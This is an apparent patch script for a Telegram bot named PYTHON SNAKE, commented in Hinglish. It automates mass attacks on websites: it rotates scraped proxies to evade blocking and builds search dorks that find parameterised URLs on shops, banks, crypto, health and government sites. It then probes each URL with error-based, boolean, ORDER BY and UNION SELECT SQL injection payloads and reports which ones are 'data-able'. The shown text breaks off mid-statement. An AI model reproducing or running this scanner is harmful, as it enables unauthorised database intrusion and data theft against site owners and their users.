#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
  PYTHON SNAKE  (v22)  —  THE BIG ONE
  --------------------------------------------------------------------------
  1.  BRANDING   : 🕷️ Spidey / SPIDEY-X  ->  🐍 PYTHON SNAKE (UI + texts)
  2.  PROXY V2   : naye lenient verifier + quality pool + /proxyscan
                   (purana verifier Bing/DuckDuckGo ke exact text pe atakta tha
                    isliye "proxy scrape kaam nahi kar raha" dikhta tha)
  3.  NO-PROXY   : proxy na ho to parser safe-engines + Wayback/CC pe shift
                   ho jata hai -> 0 URLs wali problem khatam
  4.  AUTO DUMP  : 1-tap full chain -> keywords > dorks > urls > sqli > REPORT
  5.  UNIVERSAL  : naya dork engine jo keywords dekh kar templates KHUD banata
      DORKS        hai (CC-specific nahi). Purane CC templates waise hi rehte.
  6.  SQLI V2    : false-positive killer — ORDER BY / UNION / boolean proof +
                   "page me asli data hai ya nahi" check. Jo URL database-less
                   hai wo report me nahi aayega.
  7.  CLEANUP    : 11 redundant buttons chhupe (code safe) + /classic se wapas
  8.  LOGO       : /brand command (assets/python_snake_logo.png agar file ho)

  Run:  python3 python_snake_v22.py [bot_fixed.py]
================================================================================
"""

import ast
import os
import re
import sys
import shutil
import py_compile
from datetime import datetime

MARK_START = "# ═══ PYTHON SNAKE v22 START ═══"
MARK_END = "# ═══ PYTHON SNAKE v22 END ═══"

BLOCK = r'''
# ═══ PYTHON SNAKE v22 START ═══
#  PART 1 — BRAND + CONFIG
# ═══════════════════════════════════════════════════════════════════════════════
_V22_TAG = "PYTHON SNAKE"
_V22_VER = "v22"
_V22_EMOJI = "🐍"
_V22_BRAND_LINE = "🐍 <b>PYTHON SNAKE</b> 🐍"

_V19_DEFAULT_CFG.update({
    "no_proxy_mode": True,     # proxy na ho to safe engines pe jao
    "sqli_min_conf": 60,       # is confidence se kam = report me nahi
    "auto_scale": "standard",  # quick | standard | deep
    "auto_verify_sqli": True,
})

_V22_SCALES = {
    "quick":    {"kw": 300,   "dorks": 1000,  "urls": 150,  "label": "⚡ Quick  (1-3 min)"},
    "standard": {"kw": 1000,  "dorks": 10000, "urls": 1200, "label": "⚖️ Standard (10-20 min)"},
    "deep":     {"kw": 3000,  "dorks": 40000, "urls": 4000, "label": "🌊 Deep (30-60 min)"},
}


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 2 — PROXY ENGINE v2
#  Purana verifier Bing/Yahoo/DDG ke robots.txt me exact "user-agent" dhoondhta
#  tha — ek bhi byte ka farak = proxy "dead". Free proxies 90% baar apna error
#  page dete hain, isliye sab fail dikhte the. Ab: 6 lenient targets, JSON
#  endpoints, aur "kaam chalau" scoring.
# ═══════════════════════════════════════════════════════════════════════════════
_V22_PROXY_FILE = os.path.join(DATA_DIR, "v22_proxy_pool.json")

_V22_PROXY_TARGETS = [
    ("http://httpbin.org/ip",           "origin"),
    ("http://ip-api.com/json",          "query"),
    ("https://api.ipify.org?format=json", "ip"),
    ("http://httpbin.org/get",          "origin"),
    ("https://ifconfig.me/all.json",    "ip_addr"),
    ("http://neverssl.com/",            "html"),
]

_V22_PROXY_POOL: dict = {}      # "host:port" -> {"ms": int, "ts": float, "ok": int, "fail": int}
_V22_PROXY_LOADED = {"done": False}


def _v22_proxy_load() -> dict:
    global _V22_PROXY_POOL
    if _V22_PROXY_LOADED["done"]:
        return _V22_PROXY_POOL
    _V22_PROXY_LOADED["done"] = True
    try:
        if os.path.isfile(_V22_PROXY_FILE):
            with open(_V22_PROXY_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, dict):
                now = time.time()
                _V22_PROXY_POOL = {
                    k: v for k, v in data.items()
                    if isinstance(v, dict) and (now - float(v.get("ts") or 0)) < 86400
                }
    except Exception:
        _V22_PROXY_POOL = {}
    return _V22_PROXY_POOL


def _v22_proxy_save() -> None:
    try:
        tmp = _V22_PROXY_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(_V22_PROXY_POOL, f)
        os.replace(tmp, _V22_PROXY_FILE)
    except Exception:
        pass


_V22_PX_DIRTY = {"n": 0}
_V22_BAD_PX = set()          # is session me do baar fail → dobara use nahi
_V22_PX_STREAK: dict = {}


def _v22_proxy_note(proxy_raw: str, ok: bool) -> None:
    """Live proxy ko score do; 3 fail hone par pool se hata do (self-healing)."""
    n = _v22_norm_proxy(proxy_raw or "")
    if not n:
        return
    try:
        pool = _v22_proxy_load()
        e = pool.get(n) or {"ms": 9999, "ts": time.time(), "ok": 0, "fail": 0}
        if ok:
            e["ok"] = int(e.get("ok") or 0) + 1
            e["ts"] = time.time()
            _V22_PX_STREAK[n] = 0
            _V22_BAD_PX.discard(n)
        else:
            e["fail"] = int(e.get("fail") or 0) + 1
            _V22_PX_STREAK[n] = int(_V22_PX_STREAK.get(n) or 0) + 1
            if _V22_PX_STREAK[n] >= 2:
                _V22_BAD_PX.add(n)
            if e["fail"] >= 3 and int(e.get("ok") or 0) == 0:
                pool.pop(n, None)
        if n in pool or ok:
            pool[n] = e
        _V22_PX_DIRTY["n"] += 1
        if _V22_PX_DIRTY["n"] % 40 == 0 or not ok:
            _v22_proxy_save()
    except Exception:
        pass


def _v22_norm_proxy(raw: str) -> str:
    """'http://1.2.3.4:8080' / '1.2.3.4:8080' / 'socks5://..' -> '1.2.3.4:8080'"""
    s = (raw or "").strip()
    if not s:
        return ""
    s = re.sub(r"^[a-zA-Z0-9]+://", "", s).strip("/")
    if "@" in s:
        s = s.rsplit("@", 1)[1]
    if ":" not in s:
        return ""
    host, port = s.rsplit(":", 1)
    if not re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host):
        return ""
    if not port.isdigit() or not (1 <= int(port) <= 65535):
        return ""
    return "%s:%s" % (host, port)


async def _v22_verify_proxy(session, proxy_raw: str, timeout: float = 6.0) -> dict:
    """Lenient verifier — koi ek target bhi valid JSON/HTML de to proxy LIVE."""
    np_ = _v22_norm_proxy(proxy_raw)
    if not np_:
        return {"ok": False, "ms": 0}
    proxy_url = "http://" + np_
    t0 = time.time()
    targets = list(_V22_PROXY_TARGETS)
    random.shuffle(targets)
    for url, sig in targets[:3]:
        try:
            async with session.get(
                url, proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=timeout, sock_connect=timeout, sock_read=timeout),
                ssl=False, allow_redirects=True,
                headers={"User-Agent": random.choice(_V19_UAS), "Accept": "*/*"},
            ) as r:
                body = (await r.text(errors="ignore"))[:4000]
            low = body.lower()
            if r.status == 200 and len(body) > 12:
                if sig in low or body.strip().startswith(("{", "[")) or "html" in low:
                    return {"ok": True, "ms": int((time.time() - t0) * 1000)}
        except Exception:
            continue
    return {"ok": False, "ms": 0}


async def _v22_proxy_scan(want: int = 150, concurrency: int = 220,
                          progress=None, force: bool = False) -> dict:
    """Scrape -> dedupe -> verify -> quality-sorted pool."""
    pool = _v22_proxy_load()
    st = {"scraped": 0, "checked": 0, "alive": 0, "pool": len(pool),
          "target": want, "best_ms": 0, "started": time.time()}
    if not force and len(pool) >= want:
        st["alive"] = len(pool)
        return st

    raw = []
    try:
        raw = await _v7_scrape_tiered_sources(0, force_refresh=force)
    except Exception:
        pass
    if not raw:
        try:
            raw = await _scrape_fresh_proxies()
        except Exception:
            raw = []
    cands = []
    seen = set()
    for r_ in raw:
        n = _v22_norm_proxy(r_)
        if n and n not in seen:
            seen.add(n)
            cands.append(n)
    st["scraped"] = len(cands)
    if not cands:
        return st
    random.shuffle(cands)
    # pehle jo pehle se alive hain unhe chhodo
    cands = [c for c in cands if c not in pool][:6000]

    sem = asyncio.Semaphore(concurrency)
    conn = aiohttp.TCPConnector(limit=concurrency + 100, ssl=False, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=conn) as session:
        async def _one(p):
            async with sem:
                res = await _v22_verify_proxy(session, p)
            st["checked"] += 1
            if res["ok"]:
                st["alive"] += 1
                _V22_PROXY_POOL[p] = {"ms": res["ms"], "ts": time.time(), "ok": 1, "fail": 0}
            if progress and st["checked"] % 120 == 0:
                try:
                    await progress(dict(st))
                except Exception:
                    pass
            return res["ok"]

        await asyncio.gather(*[asyncio.create_task(_one(c)) for c in cands], return_exceptions=True)

    # purane dead hatao
    now = time.time()
    for k in [k for k, v in list(_V22_PROXY_POOL.items())
              if (now - float(v.get("ts") or 0)) > 6 * 3600]:
        _V22_PROXY_POOL.pop(k, None)
    _v22_proxy_save()
    st["pool"] = len(_V22_PROXY_POOL)
    if _V22_PROXY_POOL:
        st["best_ms"] = min(int(v.get("ms") or 9999) for v in _V22_PROXY_POOL.values())
    st["elapsed"] = time.time() - st["started"]
    return st


def _v22_good_proxies(uid: int = 0, limit: int = 0) -> list:
    """Proxy list for parser — user ke apne + v22 pool + legacy global pool."""
    out, seen = [], set()

    def _push(px):
        n = _v22_norm_proxy(px)
        if n and n not in seen:
            seen.add(n)
            out.append("http://" + n)

    try:
        for px in (user_proxies.get(int(uid)) or []):
            _push(px)
    except Exception:
        pass
    try:
        pool = _v22_proxy_load()
        now = time.time()
        alive = {}
        for k, v in pool.items():
            if not isinstance(v, dict):
                continue
            ok_n, fail_n = int(v.get("ok") or 0), int(v.get("fail") or 0)
            if k in _V22_BAD_PX:
                continue                       # is run me fail ho chuka
            if fail_n >= 3 and ok_n == 0:
                continue                       # kabhi kaam nahi kiya
            if fail_n > ok_n * 2 + 2:
                continue                       # ab bharta ja raha hai
            if ok_n == 0 and (now - float(v.get("ts") or 0)) > 6 * 3600:
                continue                       # purana unverified
            alive[k] = v
        for k, _v in sorted(alive.items(), key=lambda kv: (int(kv[1].get("fail") or 0),
                                                           int(kv[1].get("ms") or 9999))):
            _push(k)
    except Exception:
        pass
    try:
        for px in (global_proxy_pool or []):
            _push(px)
    except Exception:
        pass
    return out[:limit] if limit else out


# parser isse proxy leta hai
_v22_prev_effective_proxy = effective_proxy_pool


def effective_proxy_pool(uid: int) -> list:   # noqa: F811
    merged = _v22_good_proxies(int(uid))
    if merged:
        return merged
    try:
        return _v22_prev_effective_proxy(uid) or []
    except Exception:
        return []


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 3 — NO-PROXY SAFE ENGINES
#  Proxy nahi hai to Google/Brave/DDG turant block karte hain -> 0 URLs.
#  Ye engines bina proxy bhi chalte hain + Wayback/CC to hai hi.
# ═══════════════════════════════════════════════════════════════════════════════
_V22_SAFE_ENGINES = {
    "bing_rss", "mojeek", "marginalia", "ecosia", "yep", "stract", "wiby",
    "aol", "yahoo_us", "yahoo_uk", "yahoo_in", "yahoo_ca", "yahoo_au",
    "ddg_lite", "searx_be", "priv_au", "searxng",
}

_v21_prev_pick_engines = _v21_pick_engines


def _v21_pick_engines(idx: int, pg: int, fanout: int) -> list:   # noqa: F811
    try:
        have_proxy = bool(_v22_good_proxies(0, limit=1))
    except Exception:
        have_proxy = False
    if have_proxy:
        return _v21_prev_pick_engines(idx, pg, fanout)
    safe = [e for e in _V19_ENGINES if e[0] in _V22_SAFE_ENGINES]
    if not safe:
        return _v21_prev_pick_engines(idx, pg, fanout)
    safe = sorted(safe, key=lambda e: -_v21_score(e[0]))
    start = (idx * 3 + pg * 5) % max(1, len(safe))
    picks = []
    for k in range(max(1, fanout)):
        picks.append(safe[(start + k) % len(safe)])
    return picks


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 4 — UNIVERSAL DORK ENGINE (keywords se template KHUD bante hain)
# ═══════════════════════════════════════════════════════════════════════════════
_V22_NICHE = {
    "gaming":  ["steam", "valorant", "pubg", "fortnite", "roblox", "cdkey", "gamepass", "riot", "epic"],
    "ott":     ["netflix", "spotify", "prime", "disney", "crunchyroll", "iptv", "hotstar", "hulu"],
    "crypto":  ["btc", "usdt", "ethereum", "crypto", "binance", "wallet", "coinbase", "binancepay"],
    "hosting": ["cpanel", "whm", "vps", "hosting", "saas", "domain", "cloud", "plesk", "whmcs"],
    "ecom":    ["shopify", "woocommerce", "magento", "checkout", "cart", "store", "product", "order"],
    "finance": ["bank", "loan", "insurance", "invoice", "payment", "billing", "wallet", "paypal"],
    "edu":     ["school", "college", "student", "exam", "result", "university", "admission"],
    "health":  ["hospital", "clinic", "doctor", "patient", "pharmacy", "appointment"],
    "travel":  ["hotel", "booking", "flight", "ticket", "tour", "reservation"],
    "gov":     ["gov", "municipal", "portal", "citizen", "tax", "license"],
}
_V22_NICHE_TERMS = {
    "gaming":  ["steam wallet", "game topup", "gift card", "cd key"],
    "ott":     ["premium account", "subscription", "free trial", "iptv"],
    "crypto":  ["usdt", "bitcoin", "wallet", "exchange"],
    "hosting": ["cpanel", "whmcs clientarea", "vps panel"],
    "ecom":    ["checkout", "cart", "order", "invoice"],
    "finance": ["netbanking", "invoice", "statement", "billing"],
    "edu":     ["student portal", "exam result", "admission form"],
    "health":  ["patient portal", "appointment", "prescription"],
    "travel":  ["booking", "reservation", "ticket"],
    "gov":     ["citizen portal", "tax payment", "license"],
    "general": ["login", "account", "dashboard", "panel"],
}

_V22_PARAMS = ["id", "pid", "cid", "uid", "cat", "catid", "category", "product_id", "item",
               "itemid", "page", "pageid", "view", "viewid", "order", "orderid", "invoice",
               "user", "userid", "username", "search", "q", "keyword", "s", "ref", "code",
               "token", "key", "file", "doc", "article", "news", "post", "brand", "model",
               "type", "sort", "filter", "album", "gallery", "download"]
_V22_EXTS = ["php", "asp", "aspx", "jsp", "html", "cgi", "do", "action"]
_V22_PAGES = ["index", "product", "products", "item", "items", "detail", "details", "view",
              "page", "category", "catalog", "shop", "store", "cart", "checkout", "order",
              "orders", "invoice", "login", "user", "account", "search", "results", "news",
              "article", "post", "blog", "download", "file", "get", "show", "display", "info"]
_V22_MODS = ["inurl:", "allinurl:", "intitle:", "allintitle:", "intext:", "inbody:",
             "intitle:\"index of\"", "inurl:admin", "inurl:api", "inurl:ajax", "inurl:api/v1"]
_V22_TLDS = [".com", ".net", ".org", ".in", ".pk", ".bd", ".id", ".br", ".tr", ".ru",
             ".de", ".uk", ".it", ".es", ".mx", ".ar", ".co", ".io", ".store", ".shop"]


def _v22_detect_niche(keywords: list) -> str:
    blob = " ".join((k or "").lower() for k in keywords[:200])
    best, best_n = "general", 0
    for niche, words in _V22_NICHE.items():
        n = sum(1 for w in words if w in blob)
        if n > best_n:
            best, best_n = niche, n
    return best


def _v22_universal_dorks(keywords: list, count: int, niche: str = "") -> list:
    """Keywords dekh kar template families khud banata hai — CC-specific nahi,
    kisi bhi niche pe kaam karta hai. Exact count, sab unique."""
    count = max(1, int(count))
    kws = []
    seen_kw = set()
    for k in keywords:
        k = " ".join((k or "").strip().split())
        if k and len(k) < 90 and k.lower() not in seen_kw:
            seen_kw.add(k.lower())
            kws.append(k)
    if not kws:
        kws = ["login"]
    niche = niche or _v22_detect_niche(kws)
    terms = list(kws) + _V22_NICHE_TERMS.get(niche, _V22_NICHE_TERMS["general"])
    random.shuffle(_V22_PARAMS)
    random.shuffle(_V22_PAGES)
    random.shuffle(_V22_EXTS)

    out, seen = [], set()

    def _emit(d: str) -> bool:
        d = " ".join(d.split())
        if not d or d.lower() in seen:
            return False
        seen.add(d.lower())
        out.append(d)
        return len(out) >= count

    # ── FAMILY A: page + param + ext (sabse zyada hit) ────────────────────
    for t in terms:
        for page in _V22_PAGES:
            for prm in _V22_PARAMS:
                for ext in _V22_EXTS[:3]:
                    if _emit('{t} inurl:{page}.{ext}?{prm}='.format(t=t, page=page, ext=ext, prm=prm)):
                        return out
    # ── FAMILY B: plain inurl param (koi extension nahi) ──────────────────
    for t in terms:
        for prm in _V22_PARAMS:
            for mod in ("inurl:?", "allinurl:?"):
                if _emit('%s %s%s=' % (t, mod, prm)):
                    return out
    # ── FAMILY C: niche word + param + tld ────────────────────────────────
    for t in terms:
        for prm in _V22_PARAMS[:24]:
            for tld in _V22_TLDS[:12]:
                if _emit('"%s" inurl:?%s= site:%s' % (t, prm, tld)):
                    return out
    # ── FAMILY D: mods + page ─────────────────────────────────────────────
    for t in terms:
        for mod in _V22_MODS:
            for page in _V22_PAGES[:18]:
                if _emit('%s %s%s' % (mod, t, page)):
                    return out
    # ── FAMILY E: api/ajax/json endpoints ─────────────────────────────────
    for t in terms:
        for prm in _V22_PARAMS[:20]:
            for pat in ("inurl:api?%s=", "inurl:ajax?%s=", "inurl:json?%s=", "inurl:rest?%s="):
                if _emit('%s %s' % (t, pat % prm)):
                    return out
    # ── FAMILY F: admin/panel style ───────────────────────────────────────
    for t in terms:
        for pat in ("admin", "panel", "cp", "dashboard", "manage", "backend"):
            for prm in _V22_PARAMS[:10]:
                if _emit('%s inurl:%s inurl:?%s=' % (t, pat, prm)):
                    return out
    # ── FAMILY G: filler (agar count bacha) ───────────────────────────────
    i = 0
    while len(out) < count and i < count * 40:
        i += 1
        t = random.choice(terms)
        page = random.choice(_V22_PAGES)
        prm = random.choice(_V22_PARAMS)
        ext = random.choice(_V22_EXTS)
        tld = random.choice(_V22_TLDS)
        d = random.choice([
            '%s inurl:%s.%s?%s=' % (t, page, ext, prm),
            '"%s" inurl:?%s= site:%s' % (t, prm, tld),
            '%s %s%s.%s?%s=' % (t, random.choice(("inurl:", "allinurl:")), page, ext, prm),
            '%s intext:%s inurl:?%s=' % (t, random.choice(terms), prm),
        ])
        _emit(d)
    return out


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 5 — SQLI ENGINE v2 (false positive killer)
#  Proof levels:  error-based(60) → boolean diff(80) → ORDER BY cols(90) →
#                 UNION reflection(95).  Plus "page me data hai?" prefilter.
# ═══════════════════════════════════════════════════════════════════════════════
_V22_SQLI_STATIC = ("page not found", "404 not found", "coming soon", "under construction",
                    "domain for sale", "parked domain", "account suspended", "default page",
                    "it works!", "welcome to nginx", "apache2 default page")


def _v22_set_param(url: str, idx: int, value: str) -> str:
    try:
        p = urllib_parse.urlparse(url)
        pairs = urllib_parse.parse_qsl(p.query, keep_blank_values=True)
        if idx >= len(pairs):
            return url
        k, _ = pairs[idx]
        pairs[idx] = (k, value)
        return urllib_parse.urlunparse(p._replace(query=urllib_parse.urlencode(pairs)))
    except Exception:
        return url


def _v22_orig_value(url: str, idx: int) -> str:
    try:
        pairs = urllib_parse.parse_qsl(urllib_parse.urlparse(url).query, keep_blank_values=True)
        if idx < len(pairs):
            return pairs[idx][1] or "1"
    except Exception:
        pass
    return "1"


async def _v22_get(session, url: str, proxy: str = "", timeout: float = 8.0):
    kw = {"timeout": aiohttp.ClientTimeout(total=timeout), "ssl": False, "allow_redirects": True,
          "headers": {"User-Agent": random.choice(_V19_UAS),
                      "Accept": "text/html,application/xhtml+xml,*/*;q=0.8"}}
    if proxy:
        kw["proxy"] = proxy
    try:
        async with session.get(url, **kw) as r:
            body = await r.text(errors="ignore")
            if proxy:
                _v22_proxy_note(proxy, r.status < 400 and len(body) > 200)
            return r.status, body
    except Exception:
        if proxy:
            _v22_proxy_note(proxy, False)
        return 0, ""


def _v22_page_has_data(body: str) -> tuple:
    """(has_data, reason) — khaali/parked page ko shuru me hi reject."""
    lb = (body or "").lower()
    if len(lb) < 300:
        return False, "page bahut chhota (%dB)" % len(lb)
    for s in _V22_SQLI_STATIC:
        if s in lb and len(lb) < 4000:
            return False, "static/parked page"
    return True, ""


async def _v22_probe(session, url: str, proxy: str = "", fast: bool = False) -> dict:
    """Ek URL pe 4 level ka proof. fast=True → kam requests (Quick scale)."""
    res = {"url": url, "conf": 0, "dbms": "", "cols": 0, "proof": [], "why": "", "ok": False,
           "retry_direct": False}
    code, body = await _v22_get(session, url, proxy)
    if code == 0:
        res["why"] = "no response"
        if proxy:
            res["retry_direct"] = True
        return res
    if code not in (200, 301, 302, 500):
        res["why"] = "http %s" % code
        if proxy:
            res["retry_direct"] = True
        return res
    has_data, reason = _v22_page_has_data(body)
    if not has_data:
        res["why"] = reason
        if proxy and reason:
            # proxy ne generic/portal page diya ho sakta hai — direct dobara dekho
            res["retry_direct"] = True
        return res
    base_err = _v19_sql_error(body)
    base_len = len(body)

    # ── page stability: 2 baar maango. Random ads/nonce wale page par koi bhi
    #    length-diff proof jhoota hota hai (asli false-positive ki jad).
    jitter = 0
    _p2, _b2 = await _v22_get(session, url, proxy)
    if _b2:
        jitter = abs(len(_b2) - base_len)
    dynamic = jitter > max(120, int(base_len * 0.03))

    try:
        nparams = max(1, min(3, len(urllib_parse.parse_qsl(urllib_parse.urlparse(url).query))))
    except Exception:
        nparams = 1

    pidx = 0
    orig = _v22_orig_value(url, pidx)

    # ---- 1. error based (2 different payloads must agree) -------------------
    err_hits = []
    _pays = ("'", "\\", '"', "')", "1'") if fast else (
        "'", "''", "')", "')--", "\\", '"', "' OR '1'='1", "1'", "1)")
    for pay in _pays:
        cand = _v22_set_param(url, pidx, orig + pay)
        c2, b2 = await _v22_get(session, cand, proxy)
        e2 = _v19_sql_error(b2)
        if e2 and e2 != base_err:
            err_hits.append((e2, pay))
    if err_hits:
        res["dbms"] = err_hits[0][0]
        res["conf"] = max(res["conf"], 60)
        res["proof"].append("SQL error (%s)" % err_hits[0][0])

    # ---- 2. boolean differential (1=1 true vs 1=2 false) -------------------
    # pehle page ki natural jitter naapo (ads/nonce) — warna random page bhi
    # "boolean injectable" lagta hai (yahi false-positive ki jad thi).
    if len(body) > 500 and not dynamic and not (fast and err_hits):
        c_t, b_t = await _v22_get(session, _v22_set_param(url, pidx, "%s AND 1=1-- -" % orig), proxy)
        c_f, b_f = await _v22_get(session, _v22_set_param(url, pidx, "%s AND 1=2-- -" % orig), proxy)
        if c_t == 200 and c_f in (200, 500):
            dt = abs(len(b_t) - base_len)
            df = abs(len(b_f) - base_len)
            if (dt <= max(60, int(base_len * 0.05), jitter + 40)
                    and df >= max(150, int(base_len * 0.10), jitter + 120)):
                res["conf"] = max(res["conf"], 80)
                res["proof"].append("boolean diff (%dB vs %dB)" % (len(b_t), len(b_f)))
                if not res["dbms"]:
                    res["dbms"] = "MySQL/Generic"

    # ---- 3. ORDER BY column count (SQL ne execute kiya = pakka proof) ------
    ok_until = 0
    changed = False
    olen = []
    _ob_max = 6 if fast else 10
    for n in range(1, _ob_max + 1):
        c3, b3 = await _v22_get(session, _v22_set_param(url, pidx, "%s ORDER BY %d-- -" % (orig, n)), proxy)
        e3 = _v19_sql_error(b3)
        if c3 != 200 or e3:
            break
        olen.append(len(b3))
        if abs(len(b3) - base_len) > max(60, 2 * jitter):
            changed = True
        ok_until = n
    # (a) page param ignore karta hai → har ORDER BY same body → koi proof nahi
    _spread = (max(olen) - min(olen)) if olen else 0
    _ignore = bool(olen) and _spread <= max(40, 2 * jitter) and not err_hits
    # (b) bodies khud hi erratic hain → length-diff ko proof mat maano
    _erratic = dynamic or _spread > max(90, 3 * jitter + 60)
    if _ignore:
        ok_until = 0
    if ok_until >= 2 and ((changed and not _erratic) or ok_until < _ob_max or err_hits):
        res["cols"] = ok_until
        res["conf"] = max(res["conf"], 90 if (ok_until < 10 or err_hits) else 88)
        res["proof"].append("ORDER BY ok to %d cols" % ok_until)
    elif ok_until == 1 and (err_hits or res["conf"] >= 60):
        res["cols"] = 1
        res["conf"] = max(res["conf"], 72)
        res["proof"].append("ORDER BY 1 ok")

    # ---- 4. UNION reflection (data nikalne layak?) -------------------------
    if res["cols"] >= 1:
        marker = "987654321"
        sel = ",".join([marker] + ["NULL"] * (res["cols"] - 1))
        c4, b4 = await _v22_get(session, _v22_set_param(url, pidx, "%s UNION SELECT %s-- -" % (orig, sel)), proxy)
        if c4 == 200 and marker in b4 and marker not in body:
            res["conf"] = max(res["conf"], 95)
            res["proof"].append("UNION reflected ✅ data-able")
        else:
            nul = ",".join(["NULL"] * res["cols"])
            c5, b5 = await _v22_get(session, _v22_set_param(url, pidx, "%s UNION SELECT %s-- -" % (orig, nul)), proxy)
            if c5 == 200 and abs(len(b5) - base_len) > 120:
                res["conf"] = max(res["conf"], 90)
                res["proof"].append("UNION changes page")

    res["ok"] = res["conf"] >= 50
    if not res["ok"] and not res["why"]:
        res["why"] = "no proof (static/not injectable)"
    return res


async def _v19_sqli_scan(urls: list, uid: int, progress=None, fast: bool = False) -> dict:   # noqa: F811
    """v22 — verified scan. Sirf asli injectable URLs report hoti hain.
    fast=True → Quick scale ke liye kam probes (speed budget)."""
    urls = [u.strip() for u in urls
            if u and u.strip().startswith(("http://", "https://")) and "=" in u]
    urls = list(dict.fromkeys(urls))
    total = len(urls)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_path = os.path.join(_V19_OUT_DIR, "V22_SQLi_VERIFIED_%s.txt" % ts)
    full_path = os.path.join(_V19_OUT_DIR, "V22_SQLi_REPORT_%s.tsv" % ts)
    min_conf = int(_v19_load_cfg().get("sqli_min_conf") or 60)
    st = {"scanned": 0, "total": total, "vulns": 0, "errors": 0, "skipped": 0,
          "threads": 0, "started": time.time(), "confirmed": 0, "dataable": 0,
          "min_conf": min_conf}
    stop_ev = _V19_STOP.get(int(uid)) or asyncio.Event()
    proxies = _v22_good_proxies(int(uid), limit=400)
    threads = 40 if _V19_HW["termux"] else 120
    try:
        threads = min(threads, int(_v19_effective()["threads"]) or threads)
    except Exception:
        pass
    threads = max(10, threads)
    st["threads"] = threads
    sem = asyncio.Semaphore(threads)
    hits = []
    conn = aiohttp.TCPConnector(limit=threads * 3, ssl=False, ttl_dns_cache=300)
    fh = open(out_path, "w", encoding="utf-8", buffering=1024 * 64)
    rf = open(full_path, "w", encoding="utf-8", buffering=1024 * 64)
    rf.write("url\tdbms\tcolumns\tconfidence\tproof\n")

    async with aiohttp.ClientSession(connector=conn) as session:
        async def _one(u: str) -> None:
            if stop_ev.is_set():
                return
            async with sem:
                px = proxies[random.randrange(len(proxies))] if proxies else ""
                try:
                    r = await _v22_probe(session, u, px, fast=fast)
                    if r.get("retry_direct") and px:
                        # proxy ne page theek se nahi diya → direct dobara (asli URL miss na ho)
                        st["proxy_retry"] = st.get("proxy_retry", 0) + 1
                        r = await _v22_probe(session, u, "", fast=fast)
                except Exception:
                    r = {"ok": False, "conf": 0, "why": "exc", "url": u}
                st["scanned"] += 1
                if r.get("conf", 0) >= min_conf:
                    st["vulns"] += 1
                    if r["conf"] >= 80:
                        st["confirmed"] += 1
                    if "UNION reflected" in " ".join(r.get("proof") or []):
                        st["dataable"] += 1
                    hits.append((u, r.get("dbms") or "?"))
                    fh.write(u + "\n")
                    fh.flush()
                    rf.write("%s\t%s\t%s\t%d\t%s\n" % (
                        u, r.get("dbms") or "?", r.get("cols") or 0, r["conf"],
                        "; ".join(r.get("proof") or [])[:180]))
                    rf.flush()
                elif r.get("why"):
                    st["skipped"] += 1

        tasks = [asyncio.create_task(_one(u)) for u in urls]
        last = 0.0
        while True:
            pending = [t for t in tasks if not t.done()]
            if not pending:
                break
            await asyncio.sleep(1.0)
            if progress and (time.time() - last) >= 3.0:
                last = time.time()
                try:
                    await progress(dict(st))
                except Exception:
                    pass
            if stop_ev.is_set():
                for t in pending:
                    t.cancel()
                break
    fh.close()
    rf.close()
    st["elapsed"] = time.time() - st["started"]
    return {"stats": st, "path": out_path, "report_path": full_path, "hits": hits}


async def _v19_do_sqli(update, context, urls: list) -> int:   # noqa: F811
    uid = update.effective_user.id
    chat_id = update.effective_chat.id
    ev = asyncio.Event()
    _V19_STOP[int(uid)] = ev
    proxies = _v22_good_proxies(int(uid), limit=1)
    msg = await context.bot.send_message(
        chat_id=chat_id,
        text=("🐍 <b>SQLi CHECKER v2</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
              "🔬 4-level proof: error • boolean • ORDER BY • UNION\n"
              "🧅 Proxies: <code>%s</code>\n\n<code>[%s]</code> 0%%")
             % (len(proxies) or "direct", _v19_bar(0)),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Sᴛᴏᴘ", callback_data="v19_stop")]]),
    )
    mid = msg.message_id
    last = {"t": 0.0}

    async def _progress(s: dict) -> None:
        now = time.time()
        if now - last["t"] < 3.0:
            return
        last["t"] = now
        pct = s["scanned"] * 100.0 / max(1, s["total"])
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=mid, parse_mode=ParseMode.HTML,
                text=("🐍 <b>SQLi CHECKER v2 — RUNNING</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                      "📥 <b>Tested:</b> <code>%s/%s</code>\n"
                      "✅ <b>Confirmed:</b> <code>%s</code>\n"
                      "🗄️ <b>Data-able:</b> <code>%s</code>\n"
                      "🧅 <b>Proxies:</b> <code>%s</code>\n\n<code>[%s]</code> <b>%d%%</b>")
                     % (format(s["scanned"], ","), format(s["total"], ","),
                        format(s["confirmed"], ","), format(s["dataable"], ","),
                        len(proxies) or "direct", _v19_bar(pct), int(pct)))
        except Exception:
            pass

    try:
        res = await _v19_sqli_scan(urls, uid, progress=_progress)
    finally:
        _V19_STOP.pop(int(uid), None)
    st = res["stats"]
    if not proxies:
        extra = ("\n💡 <i>Bina proxy chala — kaafi sites block karengi.\n"
                 "Bade scan se pehle /proxyscan chalao.</i>")
    else:
        extra = ""
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=mid, parse_mode=ParseMode.HTML,
            text=("🐍 <b>SQLi CHECKER v2 — COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                  "📥 <b>Tested:</b> <code>%s</code>\n"
                  "✅ <b>Confirmed vulns:</b> <code>%s</code>\n"
                  "🗄️ <b>Data-able (UNION):</b> <code>%s</code>\n"
                  "🚫 <b>Fake/static skip:</b> <code>%s</code>\n"
                  "🎚 <b>Min confidence:</b> <code>%s</code>\n"
                  "⏱ <code>%.1fs</code> • 🧵 <code>%s</code>%s\n\n"
                  "📦 <i>Report + vulnerable list ready ⬇️</i>")
                 % (format(st["scanned"], ","), format(st["vulns"], ","),
